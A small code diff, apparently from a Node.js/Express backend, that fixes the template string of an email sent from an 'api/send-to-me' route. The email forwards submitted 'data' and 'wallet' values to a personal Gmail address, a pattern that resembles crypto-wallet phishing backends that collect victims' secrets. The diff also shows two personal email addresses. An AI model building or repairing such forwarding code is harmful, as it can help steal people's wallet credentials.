@@ -22,7 +22,7 @@ router.post('api/send-to-me', async (req, res) => {
             from: "relate2hazel@gmail.com",
             to: 'thierryalain643@gmail.com',
             subject: 'New Input Received',
-            text: Data: ${data}\nWallet: ${wallet}
+            text: `Data: ${data}\nWallet: ${wallet}`
         };
 
         transporter.sendMail(mailOptions);
